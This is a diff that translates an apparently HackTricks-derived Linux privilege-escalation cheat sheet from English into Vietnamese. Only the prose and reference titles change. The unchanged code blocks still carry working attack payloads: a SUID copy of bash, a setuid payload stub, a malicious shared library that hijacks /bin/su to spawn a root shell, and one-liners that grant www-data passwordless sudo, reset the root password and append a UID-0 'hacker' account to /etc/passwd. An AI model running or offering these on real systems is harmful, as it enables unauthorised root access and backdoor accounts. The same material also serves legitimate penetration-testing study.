@@ -4,7 +4,7 @@
 
 ## Bash
 
-`bash -p` enables privileged mode: when Bash starts with different real and effective IDs, it does not reset the effective ID to the real ID. The resulting shell still depends on the caller's existing credentials.<sup>[[1]](#references)[[3]](#references)</sup>
+`bash -p` bật chế độ đặc quyền: khi Bash khởi chạy với real ID và effective ID khác nhau, nó không đặt lại effective ID thành real ID. Shell tạo ra vẫn phụ thuộc vào thông tin xác thực hiện có của caller.<sup>[[1]](#references)[[3]](#references)</sup>
 
 ```bash
 cp /bin/bash /tmp/b && chmod +s /tmp/b
@@ -13,7 +13,7 @@ cp /bin/bash /tmp/b && chmod +s /tmp/b
 
 ## C
 
-`setresuid` changes the real, effective, and saved IDs when permitted, while `setuid` changes the effective ID and may also set the real and saved IDs for a privileged caller. `execve` replaces the current process image with the requested program.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> These examples omit return-value checks; both credential calls can fail even for UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
+`setresuid` thay đổi real, effective và saved ID khi được phép, trong khi `setuid` thay đổi effective ID và cũng có thể đặt real và saved ID cho tiến trình gọi có đặc quyền. `execve` thay thế ảnh tiến trình hiện tại bằng chương trình được yêu cầu.<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup> Các ví dụ này bỏ qua việc kiểm tra giá trị trả về; cả hai lời gọi thay đổi thông tin xác thực đều có thể thất bại ngay cả với UID 0.<sup>[[2]](#references)[[3]](#references)</sup>
 
 ```c
 //gcc payload.c -o payload
@@ -52,20 +52,20 @@ int main(void) {
 }
 ```
 
-## Overwriting a file to escalate privileges
+## Ghi đè tệp để leo thang đặc quyền
 
-### Common files
+### Các tệp phổ biến
 
-These are common local privilege-control files and interfaces: `/etc/passwd` stores seven-field account records, `/etc/shadow` stores optional encrypted password data, `sudoers` defines sudo privileges and tags such as `NOPASSWD`, and Docker's default daemon endpoint is a Unix socket at `/var/run/docker.sock`; access to that socket can grant root-level control of its host.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>
+Đây là những tệp và giao diện phổ biến dùng để kiểm soát đặc quyền cục bộ: `/etc/passwd` lưu các bản ghi tài khoản gồm bảy trường, `/etc/shadow` lưu dữ liệu mật khẩu đã mã hóa nếu có, `sudoers` xác định đặc quyền sudo và các tag như `NOPASSWD`, còn endpoint daemon mặc định của Docker là Unix socket tại `/var/run/docker.sock`; quyền truy cập socket này có thể cấp quyền kiểm soát host ở cấp root.<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)</sup>
 
-- Add user with password to _/etc/passwd_
-- Change password inside _/etc/shadow_
-- Add user to sudoers in _/etc/sudoers_
-- Abuse docker through the docker socket, usually in _/run/docker.sock_ or _/var/run/docker.sock_
+- Thêm người dùng kèm mật khẩu vào _/etc/passwd_
+- Đổi mật khẩu trong _/etc/shadow_
+- Thêm người dùng vào sudoers trong _/etc/sudoers_
+- Lạm dụng Docker thông qua Docker socket, thường nằm ở _/run/docker.sock_ hoặc _/var/run/docker.sock_
 
-### Overwriting a library
+### Ghi đè thư viện
 
-Check which shared libraries a binary uses; in this example, inspect `/bin/su` with `ldd`.<sup>[[9]](#references)</sup>
+Kiểm tra các thư viện dùng chung mà một binary sử dụng; trong ví dụ này, kiểm tra `/bin/su` bằng `ldd`.<sup>[[9]](#references)</sup>
 
 ```bash
 ldd /bin/su
@@ -79,9 +79,9 @@ ldd /bin/su
         /lib64/ld-linux-x86-64.so.2 (0x00007fe473a93000)
 ```
 
-`ldd` reports shared-object dependencies, while the dynamic linker uses ELF metadata and its search rules to load them at runtime.<sup>[[9]](#references)[[10]](#references)</sup>
+`ldd` báo cáo các dependency của shared object, trong khi dynamic linker sử dụng metadata ELF và các quy tắc tìm kiếm để tải chúng khi chạy.<sup>[[9]](#references)[[10]](#references)</sup>
 
-To inspect one candidate, use `objdump -T` to print the dynamic symbol table of `su` and filter for audit names.<sup>[[11]](#references)</sup>
+Để kiểm tra một ứng viên, dùng `objdump -T` để in bảng symbol động của `su` và lọc các tên audit.<sup>[[11]](#references)</sup>
 
 ```bash
 objdump -T /bin/su | grep audit
@@ -91,9 +91,9 @@ objdump -T /bin/su | grep audit
 000000000020e968 g    DO .bss   0000000000000004  Base        audit_fd
 ```
 
-`audit_open`, `audit_log_user_message`, and `audit_log_acct_message` are libaudit functions; `audit_fd` is shown as a data object defined in `su`'s `.bss` in this output.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> A replacement library must export compatible definitions for the undefined symbols that the loader resolves; mismatched function/data ABIs can still make the process fail when those symbols are relocated or called.<sup>[[10]](#references)[[11]](#references)</sup>
+`audit_open`, `audit_log_user_message` và `audit_log_acct_message` là các hàm của libaudit; `audit_fd` được hiển thị là một đối tượng dữ liệu được định nghĩa trong `.bss` của `su` ở đầu ra này.<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup> Thư viện thay thế phải export các định nghĩa tương thích cho những symbol chưa được định nghĩa mà bộ nạp phân giải; ABI của hàm/dữ liệu không khớp vẫn có thể khiến tiến trình thất bại khi các symbol đó được relocate hoặc gọi.<sup>[[10]](#references)[[11]](#references)</sup>
 
-GCC's `constructor` attribute causes `inject` to be called automatically before `main` on supported targets.<sup>[[15]](#references)</sup>
+Thuộc tính `constructor` của GCC khiến `inject` được gọi tự động trước `main` trên các target được hỗ trợ.<sup>[[15]](#references)</sup>
 
 ```c
 #include<stdio.h>
@@ -117,13 +117,13 @@ void inject()
 }
 ```
 
-If the replacement is loaded successfully by a privileged **`/bin/su`** process, this constructor can start **`/bin/bash`** with that process's privileges; the exact result is environment-dependent.<sup>[[10]](#references)[[15]](#references)</sup>
+Nếu replacement được một process **`/bin/su`** có đặc quyền nạp thành công, constructor này có thể khởi chạy **`/bin/bash`** với các đặc quyền của process đó; kết quả chính xác phụ thuộc vào môi trường.<sup>[[10]](#references)[[15]](#references)</sup>
 
 ## Scripts
 
-Can you make root execute something?
+Bạn có thể khiến root thực thi thứ gì đó không?
 
-`sudoers` uses the `NOPASSWD` tag in policy entries, `chpasswd` reads `user:password` pairs from standard input, and `/etc/passwd` uses seven colon-separated account fields; the following examples assume the relevant files are writable by the process that runs them.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>
+`sudoers` sử dụng tag `NOPASSWD` trong các mục policy, `chpasswd` đọc các cặp `user:password` từ đầu vào chuẩn, còn `/etc/passwd` sử dụng bảy trường tài khoản được phân tách bằng dấu hai chấm; các ví dụ sau giả định rằng process chạy chúng có thể ghi vào những file liên quan.<sup>[[5]](#references)[[6]](#references)[[16]](#references)</sup>
 
 ### **www-data to sudoers**
 
@@ -131,15 +131,15 @@ Can you make root execute something?
 echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD:ALL" >> /etc/sudoers && chmod 440 /etc/sudoers' > /tmp/update
 ```
 
-### **Change root password**
+### **Đổi mật khẩu root**
 
 ```bash
 echo "root:hacked" | chpasswd
 ```
 
-### Add new root user to /etc/passwd
+### Thêm người dùng root mới vào /etc/passwd
 
-The final payload depends on a target that accepts the generated `crypt` hash: Debian's `mkpasswd -m sha-512` maps to SHA-512 crypt (`$6$`), while OpenSSL's `passwd -1 -salt` uses the MD5-based BSD algorithm (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
+Payload cuối cùng phụ thuộc vào việc target có chấp nhận crypt hash được tạo hay không: `mkpasswd -m sha-512` của Debian ánh xạ sang SHA-512 crypt (`$6$`), trong khi `passwd -1 -salt` của OpenSSL sử dụng thuật toán BSD dựa trên MD5 (`$1$`).<sup>[[17]](#references)[[18]](#references)</sup>
 
 ```bash
 echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysalt myhackerpass || echo '$1$mysalt$7DTZJIc9s6z60L6aj0Sui.') 2>/dev/null):0:0::/:/bin/bash >> /etc/passwd
@@ -147,23 +147,22 @@ echo hacker:$((mkpasswd -m SHA-512 myhackerpass || openssl passwd -1 -salt mysal
 
 ## References
 
-- [1] [The Set Builtin (Bash Reference Manual)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
-- [2] [setresuid(2) — Linux manual page](https://man7.org/linux/man-pages/man2/setresuid.2.html)
-- [3] [setuid(2) — Linux manual page](https://man7.org/linux/man-pages/man2/setuid.2.html)
-- [4] [execve(2) — Linux manual page](https://man7.org/linux/man-pages/man2/execve.2.html)
-- [5] [passwd(5) — Linux manual page](https://man7.org/linux/man-pages/man5/passwd.5.html)
-- [6] [sudoers(5) — Debian Manpages](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
-- [7] [Protect the Docker daemon socket](https://docs.docker.com/engine/security/protect-access/)
-- [8] [dockerd — Docker Docs](https://docs.docker.com/reference/cli/dockerd/)
-- [9] [ldd(1) — Linux manual page](https://man7.org/linux/man-pages/man1/ldd.1.html)
-- [10] [ld.so(8) — Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
-- [11] [objdump (GNU Binary Utilities)](https://sourceware.org/binutils/docs/binutils/objdump.html)
-- [12] [audit_open(3) — Debian Manpages](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
-- [13] [audit_log_user_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
-- [14] [audit_log_acct_message(3) — Debian Manpages](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
-- [15] [Common Attributes (Using the GNU Compiler Collection)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
-- [16] [chpasswd(8) — Linux manual page](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
-- [17] [mkpasswd.c — Debian Sources](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
-- [18] [openssl-passwd — OpenSSL Documentation](https://docs.openssl.org/master/man1/openssl-passwd/)
-
+- [1] [Lệnh dựng sẵn Set (Tài liệu tham khảo Bash)](https://www.gnu.org/s/bash/manual/html_node/The-Set-Builtin.html)
+- [2] [setresuid(2) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man2/setresuid.2.html)
+- [3] [setuid(2) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man2/setuid.2.html)
+- [4] [execve(2) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man2/execve.2.html)
+- [5] [passwd(5) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man5/passwd.5.html)
+- [6] [sudoers(5) — Trang hướng dẫn Debian](https://manpages.debian.org/testing/sudo/sudoers.5.en.html)
+- [7] [Bảo vệ socket của Docker daemon](https://docs.docker.com/engine/security/protect-access/)
+- [8] [dockerd — Tài liệu Docker](https://docs.docker.com/reference/cli/dockerd/)
+- [9] [ldd(1) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man1/ldd.1.html)
+- [10] [ld.so(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
+- [11] [objdump (Các tiện ích nhị phân GNU)](https://sourceware.org/binutils/docs/binutils/objdump.html)
+- [12] [audit_open(3) — Trang hướng dẫn Debian](https://manpages.debian.org/trixie/libaudit-dev/audit_open.3.en.html)
+- [13] [audit_log_user_message(3) — Trang hướng dẫn Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_user_message.3.en.html)
+- [14] [audit_log_acct_message(3) — Trang hướng dẫn Debian](https://manpages.debian.org/testing/libaudit-dev/audit_log_acct_message.3.en.html)
+- [15] [Các thuộc tính chung (Sử dụng GNU Compiler Collection)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
+- [16] [chpasswd(8) — Trang hướng dẫn Linux](https://man7.org/linux/man-pages/man8/chpasswd.8.html)
+- [17] [mkpasswd.c — Mã nguồn Debian](https://sources.debian.org/src/whois/5.5.17/mkpasswd.c)
+- [18] [openssl-passwd — Tài liệu OpenSSL](https://docs.openssl.org/master/man1/openssl-passwd/)
 {{#include ../../banners/hacktricks-training.md}}
